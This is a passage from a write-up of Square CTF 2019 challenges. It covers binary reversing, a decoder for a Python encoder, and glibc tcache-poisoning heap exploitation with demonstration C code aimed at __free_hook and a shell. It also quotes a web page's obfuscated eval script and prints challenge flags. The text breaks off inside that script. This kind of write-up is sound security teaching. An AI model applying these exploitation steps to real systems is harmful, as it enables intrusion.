square ctf 2019 writeups
========================

# Introduction

Writeups for all the challenges I solved during the competition. Sadly I was not able to solve 'em all :(

Link to the original challenges: [Click](https://2019.squarectf.com/challenges)

# Table of Contents

* [#2 Aesni](#aesni)
* [#3 Decode me](#decode-me)
* [#4 Tcash](#tcash)
* [#5 Inwasmble](#inwasmble)
* [#8 Go cipher](#go-cipher)

# Tasks

<a name="aesni"></a>

## Aesni

*Aesni* is the first challenge I was able to solve. It is a binary / debugging challenge.

Let's dive right into it.

First, let's inspect what kind of file we are given:

```bash
$ file aesni
aesni: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```

So we have a 32-bit executable. It is stripped so debugging might be hard.

Running it also does not seem to yield promising results:

```bash
$ ./aesni
⛔
```

So let's fire up gdb and take a look at the execution.

Looking at the first instructions we can see, that the program encrypts (*aesenc @ 0x804818b*) some data using a key fetched from its data section (*first instruction @ 0x8048060*):

```objdump
 →  0x8048060                  movups xmm1, XMMWORD PTR ds:0x8048077
    0x8048067                  lea    esi, ds:0x80481f1
    0x804806d                  mov    ecx, 0x6
    0x8048072                  jmp    0x804817c
...
    0x804817c                  mov    edi, esi
    0x804817e                  mov    DWORD PTR ds:0x80481a1, ecx
    0x8048184                  movups xmm0, XMMWORD PTR ds:0x80481a1
    0x804818b                  aesenc xmm0, xmm1
    0x8048190                  movups xmm2, XMMWORD PTR [esi]
    0x8048193                  pxor   xmm2, xmm0
    0x8048197                  movups XMMWORD PTR [esi], xmm2
    0x804819a                  add    esi, 0x10
    0x804819d                  loopne 0x804817e
```

When continuing through the execution we will notice, that the program overwrites itself with the decrypted data!

My first intuition was maybe we are using the wrong key and we somehow have to alter the program in order to get the *correct* code to execute. However second thoughts on that quickly made the idea sound ridicilously complicated to design ..

So I continued stepping through the program until I came across this compare statement:

```objdump
 →  0x80481f2                  cmp    eax, 0x2
    0x80481f5                  je     0x8048211
    0x80481f7                  movups xmm1, XMMWORD PTR ds:0x8048231
    0x80481fe                  lea    esi, ds:0x8048251
```

I noticed that the register *EAX* currently is 1, so maybe if we can get it to 2 we are one step closer to the flag.

But how can we possibly modify it? The program does not accept any input whatsoever.

Well, actually not true. We can supply command line arguments. So I started the program again with an argument:

```bash
$ ./aesni AAAAAAAAAAAAAAAAAAA
```

Now, when we reach the same point of execution again the register value of *EAX* indeed is 2.

After stepping through further we will reach a point, where the program compares our argument to a string:

```objdump
    0x80480b0                  pop    edi
    0x80480b1                  lea    esi, ds:0x80480ef
 →  0x80480b7                  mov    ecx, 0xd
    0x80480bc                  repz   cmps BYTE PTR ds:[esi], BYTE PTR es:[edi]
    0x80480be                  jne    0x80480d7
    0x80480c0                  movups xmm1, XMMWORD PTR ds:0x804810c
```

And the registers at this point:
```objdump
$eax   : 0xff98d800  →  0x00000000
$ebx   : 0x0
$ecx   : 0x0
$edx   : 0x0
$esp   : 0xff98d18c  →  0x00000000
$ebp   : 0x0
$esi   : 0x080480ef  →  "ThIs-iS-fInE"
$edi   : 0xff98d8d4  →  "AAAAAAAAAAAAAAAAAAA"
$eip   : 0x080480b7  →   mov ecx, 0xd
```

We can see, that the string we supplied as argument is compared with *"ThIs-iS-fInE"*. So maybe just try this one as argument?

Indeed this is all it needs for our program to output the flag:

```bash
$ ./aesni ThIs-iS-fInE
flag-cdce7e89a7607239
```

<a name="decode-me"></a>

## Decode me

As the name suggests this is some kind of *crypto* challenge.

When unpacking the archive we will find two files: *decodeme.png.enc* and *encoder.pyc*

As the file-ending suggest *encoder* seems to be a python byte compiled file:

```bash
$ file encoder.pyc
encoder.pyc: python 2.7 byte-compiled
```

A quick query to your favourite search engine yields the [uncompyle6](https://pypi.org/project/uncompyle6/) python byte code decompiler.

It turns out it does a pretty good job:
```python
# uncompyle6 version 3.5.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.8 (default, Oct  7 2019, 12:59:55)
# [GCC 8.3.0]
# Embedded file name: encoder.py
# Compiled at: 2019-10-12 08:19:25
import base64, string, sys
from random import shuffle

def encode(f, inp):
    s = string.printable
    init = lambda : (list(s), [])
    bag, buf = init()
    for x in inp:
        if x not in s:
            continue
        while True:
            r = bag[0]
            bag.remove(r)
            diff = (ord(x) - ord(r) + len(s)) % len(s)
            if diff == 0 or len(bag) == 0:
                shuffle(buf)
                f.write(('').join(buf))
                f.write('\x00')
                bag, buf = init()
                shuffle(bag)
            else:
                break

        buf.extend(r * (diff - 1))
        f.write(r)

    shuffle(buf)
    f.write(('').join(buf))


if __name__ == '__main__':
    with open(sys.argv[1], 'rb') as (r):
        w = open(sys.argv[1] + '.enc', 'wb')
        b64 = base64.b64encode(r.read())
        encode(w, b64)
# okay decompiling encoder.pyc
```

The first thing I notice is, that the input is read as bytes and base64 encoded before the *real encoding* happens.

So let's analyze the code further.

The program steps through each character in the (b64 encoded) input string. The encoder will also only accept printable characters:

```python
# ...
s = string.printable
# ...
for x in inp:
    if x not in s:
        continue
```

So what does the inner loop do?

Keep in mind that *bag* and *buf* are initialized as list of printable characters and an empty list respectively.

* Step 1:
    The first character of *bag* is taken and removed:
    ```python
    r = bag[0]
    bag.remove(r)
    ```
* Step 2:
    A difference between it and our input is calculated:
    ```python
    diff = (ord(x) - ord(r) + len(s)) % len(s)
    ```

* Step 3:
    If the characters are equal or if the *bag* is now empty; we shuffle our *buf* and write it to the output. We reinitialize *bag* and *buf* and start over. Also note that we write a null byte (*\x00*) before the next iteration.
    ```python
    if diff == 0 or len(bag) == 0:
        shuffle(buf)
        f.write(('').join(buf))
        f.write('\x00')
        bag, buf = init()
        shuffle(bag)
    ```
* Step 4:
    Else we simply write *r* to the output and put *diff - 1* times *r* in in our *buf*. For example if *r = 'A'* and *diff = 4* we would output 'A' and extend our *buf* by ['A', 'A', 'A'].
    ```python
    buf.extend(r * (diff - 1))
    f.write(r)
    ```

Let's look at a simple toy example to understand the whole process a little bit better.

Assume ```s = [A, B, C, D, E]``` and our input is ```[D, A, C]```.

| i   | x | bag             | r     | diff | buf                       | output                                                      |
|-----|---|-----------------|-------|------|---------------------------|-------------------------------------------------------------|
| 0   | - | [A, B, C, D, E] | -     |  -   | []                        | []                                                          |
| 1   | D | [B, C, D, E]    | **A** |  3   | [*A*, *A*]                | [**A**]                                                     |
| 2   | A | [C, D, E]       | **B** |  4   | [*A*, *A*, *B*, *B*, *B*] | [**A**, **B**]                                              |
| 3.0 | C | [E, B, C, A, D] | **C** |  0   | []                        | [**A**, **B**, *B*, *A*, *B*, *A*, *B*, 0]                  |
| 3.1 | C | [B, C, A, D]    | **E** |  3   | [*E*, *E*]                | [**A**, **B**, *B*, *A*, *B*, *A*, *B*, 0, **E**]           |
| 4   | - |       -         | -     |  -   | -                         | [**A**, **B**, *B*, *A*, *B*, *A*, *B*, 0, **E**, *E*, *E*] |

Notice my pseudo random shuffle skills :)

Hopefully you can spot the pattern already.

But well, how can we decode this? Especially the shuffling does make this extremely hard? As it turns out: Not at all.
Take a closer look at the output sequence. We have a very precious indicator: The null-byte. Each sequence between two null-bytes (or the start / end) follow a *very* deterministic pattern:

The *r*s are printed in order. Also note that each *r* only occurs once. After that follow repeating *r*s representing the actual encoded character.

So in order to decode it, we just have to follow the sequence until one character repeats. After this happens, we simply have to count each seen character until the null-byte occurs. Given the count of each character, we can simply invert the calculation of *diff* and decode the sequence.

It turns out though that the inversion of the calculation of *diff* is ambigious.

```python
import string

def diff(x, r):
    return (ord(x) - ord(r) + len(string.printable)) % len(string.printable)

def diff_inv(diff_value, r):
    rv = []
    for x in string.printable:
        if diff(x, r) == diff_value:
            rv.append(x)
    return rv
```

Sometimes we may encounter values where we cannot be sure what the real value was:
```python
>>> diff_inv(13, 'a')
['n', '\n']
```

But base64 to the rescue! We know that the output has to be a valid base64 encoded string. If we simply greedily take valid characters first, we at least make sure that we can decode the final output. A wrong byte at some points should not matter too much.

Everything put together we end with something like this:

```python
#!/usr/bin/python
import sys
from collections import Counter
import base64
import string

VALID_B64 = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')

def f(x, r):
    return (ord(x) - ord(r) + len(string.printable)) % len(string.printable)

def f_inv(diff, r):
    rv = []
    for x in string.printable:
        if f(x, r) == diff and x in VALID_B64:
            rv.append(x)
    return rv

def decode(src_file):
    # read the encoded file
    with open(src_file, 'rb') as f:
        src = f.read()

    i = 0
    decoded = []
    while i < len(src):
        # I simply use a set to find the number of unique characters encountered
        r_unique = set()
        # all characters encountered until the null-byte or the end of input
        r_all = []

        while i < len(src) and src[i] != '\x00':
            r_unique.add(src[i])
            r_all.append(src[i])
            i += 1

        counts = Counter(r_all)

        for r in r_all[:len(r_unique)]:
            diff = counts[r]
            x = f_inv(diff, r)
            if len(x) > 1:
                print x
            else:
                decoded.append(x[0])
        i += 1

    return base64.b64decode(''.join(decoded))

if __name__ == '__main__':
    fname = sys.argv[1]
    print decode(fname)
```

We can then decode the given file and will find a PNG image where we can see our flag.

<a name="tcash"></a>

## Tcash

This was probably the toughest challenge for me as I had to learn quite A LOT about heap exploitation. If you are not familiar with the topic I suggest you to get some traction from resources like [this blog](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) or [this github repo](https://github.com/shellphish/how2heap). You may even take a look at the [glibc source](https://ftp.gnu.org/gnu/glibc/), it is very well documented.


Let's start by examining the file we are given.

```bash
$ file tcash
tcash: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=f59bd0426010448cdd2a18429cb11a58b234a873, not stripped
```

We can see that we have a 64 bit [PIE](https://en.wikipedia.org/wiki/Position-independent_code) executable (*LSB shared object*) and it is not stripped, so some debugging symbols are available.
Checking the security compiler-flags we will also notice that full RELRO is used, which means we cannot overwrite entries in the global offset table.

```bash
$ checksec tcash
[*] 'tcash'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So let's run it and see what happens.

```
$ ./tcash
I heard that tcache is pretty bad, but disabling it is pretty annoying.
But chunks that're greater than 0x408 don't go in tcache :)
1) malloc
2) write
3) print
4) free
-------------------------------------
>
```

There are 4 options available. Looking at these and the text given we are probably facing a heap exploitation challenge.

Each option is rather straightforward:

* *malloc* allows us to choose a slot (0-9) and allocate up to `0x6f8` (1784) bytes of memory
* *write* allows us to choose an allocated slot (0-9) and we can write up to its size bytes
* *print* simply prints the bytes in a chosen slot and
* *free* frees an allocated slot (0-9)

Next I did some blackbox testing which would hopefully yield some insight. I tried several invalid inputs, choosing wrong slots, choosing slots which are already allocated etc. I also tried large sizes, negative sizes, i.e. whatever edge case may be hard to handle / guess upfront. I happen to notice that we can actually allocate a slot of size `0`. The documentation for *malloc* tells us that this would allocate a minimal possible sized chunk of memory. So let's re-run the program with *ltrace* and see what actually happens:

```
$ ltrace ./tcash
[...]
read(00
, "0\n", 15)                                                           = 2
atoi(0x7ffd81a96d30, 0x7ffd81a96d30, 0x7ffd81a96d30, 0x7f4de8757081)   = 0
puts("size: "size:
)                                                                      = 7
read(00
, "0\n", 15)                                                           = 2
atoi(0x7ffd81a96d00, 0x7ffd81a96d00, 0x7ffd81a96d00, 0x7f4de8757081)   = 0
malloc(1784)                                                           = 0x55aaaac2f260
```

You can see that program actually allocated 1784 bytes of memory. It turns out that the program allocates 1784 bytes no matter what size we specify.

Let's take a closer look at the binary and eventually we will better understand this behaviour.

I decompiled the binary using `objdump`. There is a particularly suspicous function called `secret_chunks`

```objdump
Disassembly of section .text:
[...]
0000000000000cf6 <secret_chunks>
[...]
```

Looking at the disassembly of `main` we can see that this function is called when we enter the number `0x539` (1337) in the menu of the program:

```objdump
0000000000000dd9 <main>:
[...]
 e2b:   e8 90 fb ff ff          call   9c0 <read_int>
[...]
 e73:   3d 39 05 00 00          cmp    eax,0x539
 e78:   74 32                   je     eac <main+0xd3>
[...]
 eac:   b8 00 00 00 00          mov    eax,0x0
 eb1:   e8 40 fe ff ff          call   cf6 <secret_chunks>
[...]
```

Also there is an interesting variable `allocs` in the *bss* section. I figured it could store information on our allocations.

```objdump
Disassembly of section .bss:
0000000000202040 <allocs>
```

We can use our favourite debugger to validate some of our assumptions. I put a breakpoint at `menu` and allocate some slots followed by inspecting the memory.

I allocated 2 slots with sizes 64 (`0x40`) and 182 (`0xb6`) respectively.

```objdump
gef> x/4gx &allocs
0x563cb7148040 <allocs>:	0x000000000000003f	0x0000563cb8691260
0x563cb7148050 <allocs+16>:	0x00000000000000b5	0x0000563cb8691960
```

Looking at the memory of `allocs` I assume that it stores the size of each slot and the pointer of the memory block allocated by `malloc`. Note that the program stores sizes entered minus 1, too. We now also can check which size gets stored if we allocate a slot of size `0`:

```objdump
gef> x/6gx &allocs
0x563cb7148040 <allocs>:	0x000000000000003f	0x0000563cb8691260
0x563cb7148050 <allocs+16>:	0x00000000000000b5	0x0000563cb8691960
0x563cb7148060 <allocs+32>:	0x00000000ffffffff	0x0000563cb8692060
```

The program stores a very large number indicating a unsigned integer underflow. This makes perfect sense as the other sizes are also one short of what we requested.

The final piece of the puzzle for this challenge is the `secret_chunks` method. When choosing this (hidden) menu option (by entering *1337*) the program will allocate two more chunks using `malloc`. We can easily find their size using `ltrace`. They turn out to be exactly `0x308` bytes large.

This is very convenient as this size fits perfectly fine into the *tcache* (as the hint suggests).

So where are we going with this? Well in glibc 2.27 tcache poisoning is very easy. Take a look at this simple example:

```c
// run with glibc version 2.27
#include <stdlib.h>
#include <stdio.h>

int main() {
    size_t var;

    void *a = malloc(0x308);
    void *b = malloc(0x308);

    free(a);
    free(b);

    *(size_t*)b =&var;

    void *dummy = malloc(0x308);
    void *target = malloc(0x308);
    printf("var @ %p\ntarget @ %p\n", &var, target); // will be equal
}
```

If you reconsider everything we discovered so far, you might notice that we can do exactly the same! Well not exactly the same. Our allocated blocks are too large for the tcache (`0x6f8 > 0x408`). But since we can rewrite our memory using a slot of size `0` we can simply rewrite their size to fit into the tcache!

In order to accomplish this, we have to know a little bit more about the metadata prepending / trailing the memory blocks allocated using `malloc`. If you read the suggested resources above you will probably already know this, but here is a quick reminder.
The layout of an allocated block looks like this (taken from the glibc source):

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

The *A*, *M*, *P* flags correspond to the last three bits of the size field. This can be done in order to save some space since the blocks are always perfectly byte aligned in memory. When tampering these blocks we have to make sure to set the *P* flag correctly, which indicates that the previous block is in use.

If we can allocate a chunk at whatever location we desire we can easily place a *one gadget* at a suited position (A *one gadget* is a pointer to a piece of code, that when jumped to will spawn a shell). There is one caveat though: Currently we do not know any address in the program at all, all base addresses are randomized at every program start (PIE remember?).

If you read up on how the heap works internally you may already know the solution: After freeing any block it will contain a address which points back into the *main arena* (the datastructure which handles all the heap's internal state). Conveniently this structure is located somewhere in the memory region of *libc*. Knowing this address we can easily calculate the base address of *libc* and eventually place our chunk at arbitrary positions.

The question now is, where is a good location to place our one gadget?

Glibc defines some hooks which can be used to execute code whenever certain methods are called. These hooks are certainly a very good target for this. For convenience reasons we will choose the `__free_hook` which will be called whenever we give back heap memory by calling `free` (which we can trigger easily in the program).

Now that we have all the building blocks, let me outline our final exploit:
* Allocate the first slot with size `0` in order to manipulate the memory after this slot
* Allocate some slots:
    * One for leaking the libc base address
    * Two for poisoning the tcache
    * A few others for padding
* We then free the second slot and leak libc base address
* After that we tamper the two blocks and shrink their size so that they fit into the tcache
* We free both of them
* We overwrite the content of the second freed block to point towards our target address
* We call `secret_chunks` which allocates two slots from the tcache. The second one will be at our desired address
* Finally we write the address of our one gadget into the second *secret* chunk
* and we will free any block to get a shell :)

I put together this simple C - code which demonstrates everything:

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define LARGE 0x6f0
#define SMALL 0x308

int main(void)
{
    // our dummy target. We want to allocate a chunk at the address of `var`
    size_t var;

    // first allocate our reference block. In the real application we use this one to write / read the others
    void *r = malloc(LARGE);

    // setup some chunks, eventually we will be using a1 and a3 to setup the exploit, the others are "padding"
    void *a0 = malloc(LARGE);
    void *a1 = malloc(LARGE);
    void *a2 = malloc(LARGE);
    void *a3 = malloc(LARGE);
    void *a4 = malloc(LARGE);

    printf("r %p\n", r);
    printf("a0 %p\n", a0);
    printf("--> a1 %p\n", a1);
    printf("a2 %p\n", a2);
    printf("--> a3 %p\n", a3);
    printf("a4 %p\n", a4);

    // We free a0 because we are required to leak libc base address.
    // This is not done here but we can find the address at a0 after freeing this chunk
    free(a0);

    // Overwrite the sizes of a1 and a3 to fit into the tcache
    // also note that we set the P (previous in use) bits for each of them
    *(size_t*)(r + 2*(LARGE + 8) + 8) = SMALL + 8 | 1;
    *(size_t*)(r + 4*(LARGE + 8) + 24) = SMALL + 8 | 1;

    // freeing the tampered chunks will put them in the tcache
    free(a1);
    free(a3);

    // we can now place our target address in the second one
    // this is all it takes, no additional setup needed as this version of tcache does
    // not perform additional security checks
    *(size_t*)a3 = &var;

    void *junk = malloc(SMALL);
    void *target = malloc(SMALL);

    // finally our target chunk is located at &var
    printf("target @ %p\n", target);

    return 0;
}
```

Finally we only have to put everything together into an exploit we can actually use. You can find the python code [here](tcash/exploit.py)

Challenge #6 was closely related to this one. The only part missing was the `secret_chunks` function which made the exploitation process a lot more complicated. I figured we would have to tamper all the blocks allocated to fit a certain scheme which would yield arbitrary allocations even for large chunks, but sadly I did not manage to do so.

<a name="inwasmble"></a>

## Inwasmble

For this challenge you were given the link to a website. As the name suggests it is probably somewhat related to WebAssembly.

The site offers an input field. When entering some characters it will display a ⛔ sign, so I figured we will have to guess the correct input.

The relevant part of the page contains this html code:

```html
<pre>Inwasmble</pre>
<input id="x" type="text" onkeyup="go()" autocomplete="off">
<div id="r">&nbsp;</div>
<script>eval(unescape(escape('󠅶󠅡󠅲󠄠󠅣󠅯󠅤󠅥󠄠󠄽󠄠󠅮󠅥󠅷󠄠󠅕󠅩󠅮󠅴󠄸󠅁󠅲󠅲󠅡󠅹󠄨󠅛󠄊󠄠󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄶󠄱󠄬󠄠󠄰󠅸󠄷󠄳󠄬󠄠󠄰󠅸󠄶󠅤󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄵󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄶󠄰󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄷󠅦󠄬󠄠󠄰󠅸󠄰󠄳󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄵󠄬󠄠󠄰󠅸󠄰󠄳󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄷󠄬󠄠󠄰󠅸󠄱󠄵󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄰󠄶󠄬󠄠󠄰󠅸󠄶󠅤󠄬󠄠󠄰󠅸󠄶󠄵󠄬󠄠󠄰󠅸󠄶󠅤󠄬󠄠󠄰󠅸󠄶󠅦󠄬󠄠󠄰󠅸󠄷󠄲󠄬󠄠󠄰󠅸󠄷󠄹󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄸󠄬󠄠󠄰󠅸󠄷󠄶󠄬󠄠󠄰󠅸󠄶󠄱󠄬󠄠󠄰󠅸󠄶󠅣󠄬󠄠󠄰󠅸󠄶󠄹󠄬󠄠󠄰󠅸󠄶󠄴󠄬󠄠󠄰󠅸󠄶󠄱󠄬󠄠󠄰󠅸󠄷󠄴󠄬󠄠󠄰󠅸󠄶󠄵󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠅡󠄬󠄊󠄠󠄠󠄰󠅸󠄸󠄷󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄸󠄴󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄴󠄬󠄠󠄰󠅸󠄷󠅦󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄲󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄴󠄰󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄴󠄰󠄬󠄠󠄰󠅸󠄰󠄳󠄬󠄠󠄰󠅸󠄴󠄰󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄴󠄶󠄬󠄠󠄰󠅸󠄰󠅤󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄲󠄱󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄲󠄱󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄴󠄰󠄬󠄠󠄰󠅸󠄰󠄳󠄬󠄊󠄠󠄠󠄰󠅸󠄴󠄰󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄴󠄶󠄬󠄠󠄰󠅸󠄰󠅤󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄴󠄬󠄊󠄠󠄠󠄰󠅸󠄶󠅣󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄸󠄰󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄲󠄸󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄶󠅣󠄬󠄠󠄰󠅸󠄲󠄱󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄲󠄱󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠅣󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠅢󠄬󠄠󠄰󠅸󠄰󠅢󠄬󠄊󠄠󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄴󠄬󠄠󠄰󠅸󠄶󠅣󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄸󠄰󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄳󠄶󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄲󠅤󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄊󠄠󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄸󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄲󠅤󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄷󠄳󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄴󠄬󠄊󠄠󠄠󠄰󠅸󠄶󠅣󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄸󠄰󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄲󠅤󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄴󠄷󠄬󠄠󠄰󠅸󠄰󠅤󠄬󠄠󠄰󠅸󠄰󠄲󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄲󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠅣󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠅢󠄬󠄠󠄰󠅸󠄰󠅢󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠅦󠄬󠄠󠄰󠅸󠄰󠅢󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄰󠅢󠄬󠄠󠄰󠅸󠄰󠅢󠄬󠄠󠄰󠅸󠄲󠄷󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄴󠄱󠄬󠄠󠄰󠅸󠄸󠄰󠄬󠄠󠄰󠅸󠄰󠄱󠄬󠄊󠄠󠄠󠄰󠅸󠄰󠅢󠄬󠄠󠄰󠅸󠄲󠄰󠄬󠄠󠄰󠅸󠄴󠅡󠄬󠄠󠄰󠅸󠄶󠅡󠄬󠄠󠄰󠅸󠄵󠅢󠄬󠄠󠄰󠅸󠄶󠄰󠄬󠄠󠄰󠅸󠅡󠄰󠄬󠄠󠄰󠅸󠄶󠄴󠄬󠄠󠄰󠅸󠄹󠄲󠄬󠄠󠄰󠅸󠄷󠅤󠄬󠄠󠄰󠅸󠅣󠅦󠄬󠄠󠄰󠅸󠄴󠄲󠄬󠄊󠄠󠄠󠄰󠅸󠅥󠅢󠄬󠄠󠄰󠅸󠄴󠄶󠄬󠄠󠄰󠅸󠄰󠄰󠄬󠄠󠄰󠅸󠄱󠄷󠄬󠄠󠄰󠅸󠅦󠅤󠄬󠄠󠄰󠅸󠄵󠄰󠄬󠄠󠄰󠅸󠄳󠄱󠄬󠄠󠄰󠅸󠄶󠄷󠄬󠄠󠄰󠅸󠄱󠅦󠄬󠄠󠄰󠅸󠄲󠄷󠄬󠄠󠄰󠅸󠄷󠄶󠄬󠄠󠄰󠅸󠄷󠄷󠄬󠄊󠄠󠄠󠄰󠅸󠄴󠅥󠄬󠄠󠄰󠅸󠄳